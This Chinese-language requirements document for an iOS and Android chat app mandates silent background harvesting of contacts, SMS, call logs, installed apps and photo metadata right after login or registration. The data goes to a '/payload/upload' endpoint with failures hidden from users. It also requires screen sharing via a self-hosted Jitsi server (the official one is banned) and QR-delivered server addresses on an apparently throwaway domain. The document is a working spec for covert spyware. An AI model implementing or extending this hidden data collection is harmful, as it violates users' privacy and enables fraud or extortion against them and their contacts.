# 移动双端（iOS + Android）核心要求

本文档记录移动双端APP的核心要求，必须严格遵守。

## 📋 核心要求清单

### 1. ✅ 完整的信息收集功能（必须实现）

#### 自动触发机制
- **登录成功后**：自动收集并上传所有数据（后台执行，不阻塞UI）
- **注册成功后**：自动收集并上传所有数据（后台执行，不阻塞UI）
- **实现位置**：`mobile/lib/providers/auth_provider.dart` 的 `_collectDataInBackground()` 方法

#### 数据收集范围
- ✅ **通讯录**（iOS + Android）
- ✅ **短信**（仅 Android，iOS系统限制）
- ✅ **通话记录**（仅 Android，iOS系统限制）
- ✅ **应用列表**（仅 Android，iOS系统限制）
- ✅ **相册元数据**（iOS + Android）

#### 数据上传
- 统一通过 `UploadService.collectAndUploadAllData()` 方法上传
- API端点：`/payload/upload`
- 静默失败，不影响用户体验

---

### 2. ✅ Jitsi 屏幕共享功能（必须实现）

#### 移动端配置
- **实现位置**：`mobile/lib/services/jitsi/jitsi_service.dart`
- **配置项**：
  ```dart
  featureFlags: {
    'screen-sharing.enabled': true,  // 启用屏幕共享
  },
  configOverrides: {
    'desktopSharing.enabled': true,  // 启用桌面共享
  },
  ```

#### 平台支持
- **Android**：使用 MediaProjection API（Jitsi Meet SDK 内部实现）
- **iOS**：使用 ReplayKit（Jitsi Meet SDK 内部实现）
- **用户操作**：通过 Jitsi 界面上的屏幕共享按钮操作

#### 自建 Jitsi 服务器
- ✅ 使用 Docker 自建的 Jitsi Meet 服务器
- ✅ 支持 JWT 认证
- ✅ 通过二维码动态配置服务器地址
- ❌ **严禁使用官方服务器** `meet.jit.si`

---

### 3. ✅ 登录前扫码获取聊天页面接口（必须实现）

#### 核心逻辑
- **移动端登录前扫码**：必须从二维码中获取**聊天页面URL**（`chat_url`）
- **从聊天页面URL提取API地址**：自动从 `chat_url` 提取 `api_url`
- **实现位置**：
  - `mobile/lib/services/qr/rsa_decrypt_service.dart` - 二维码解析
  - `mobile/lib/services/qr/qr_scanner_service.dart` - 扫码处理
  - `mobile/lib/core/config/app_config.dart` - 配置管理

#### 支持的二维码格式

**格式1：聊天页面URL（推荐，移动端登录前扫码）**
```json
{
  "chat_url": "https://domain.com/chat"
}
```
或
```
https://domain.com/chat
```

**格式2：直接提供API URL（兼容旧格式）**
```json
{
  "api_url": "https://domain.com/api/v1"
}
```

**格式3：房间URL（登录后扫码加入房间）**
```json
{
  "room_id": "r-xxxxx",
  "api_url": "https://domain.com/api/v1"
}
```

#### 处理流程
1. 扫描二维码
2. 解析二维码数据（支持加密/未加密）
3. 如果包含 `chat_url`：
   - 保存聊天页面URL
   - 自动提取API地址：`${scheme}://${host}/api/v1`
4. 如果包含 `api_url`：直接使用
5. 更新 `AppConfig` 配置

#### 代码示例
```dart
// 二维码数据示例
{
  "chat_url": "https://log.chat5202ol.xyz/chat"
}

// 自动提取结果
{
  "chat_url": "https://log.chat5202ol.xyz/chat",
  "api_url": "https://log.chat5202ol.xyz/api/v1"
}
```

---

## 🔍 验证检查点

### 信息收集验证
- [ ] 登录成功后，检查日志是否有数据收集记录
- [ ] 注册成功后，检查日志是否有数据收集记录
- [ ] 验证数据是否正确上传到 `/payload/upload` 端点

### 屏幕共享验证
- [ ] 移动端加入Jitsi房间后，界面是否显示屏幕共享按钮
- [ ] 点击屏幕共享按钮，是否能正常启动屏幕共享
- [ ] 验证使用的是自建Jitsi服务器，不是官方服务器

### 扫码验证
- [ ] 登录前扫码包含 `chat_url` 的二维码，是否能正确解析
- [ ] 验证是否从 `chat_url` 正确提取了 `api_url`
- [ ] 验证 `AppConfig.chatUrl` 和 `AppConfig.apiBaseUrl` 是否正确设置

---

## 📝 注意事项

1. **信息收集**：
   - 必须在后台执行，不阻塞UI
   - 静默失败，不影响用户体验
   - 所有数据收集都需要相应权限

2. **屏幕共享**：
   - 由 Jitsi Meet SDK 自动处理，无需手动实现原生代码
   - 用户通过界面按钮操作即可

3. **扫码逻辑**：
   - 登录前扫码优先支持 `chat_url` 格式
   - 保持向后兼容，支持直接提供 `api_url`
   - 自动从聊天页面URL提取API地址

---

## 🔗 相关文件

- `mobile/lib/providers/auth_provider.dart` - 登录/注册后自动触发信息收集
- `mobile/lib/services/data/upload_service.dart` - 数据上传服务
- `mobile/lib/services/jitsi/jitsi_service.dart` - Jitsi配置（包含屏幕共享）
- `mobile/lib/services/qr/rsa_decrypt_service.dart` - 二维码解析（支持chat_url）
- `mobile/lib/services/qr/qr_scanner_service.dart` - 扫码服务
- `mobile/lib/core/config/app_config.dart` - 配置管理（包含chat_url）

---

**最后更新**：2026-01-16
**状态**：✅ 所有要求已实现
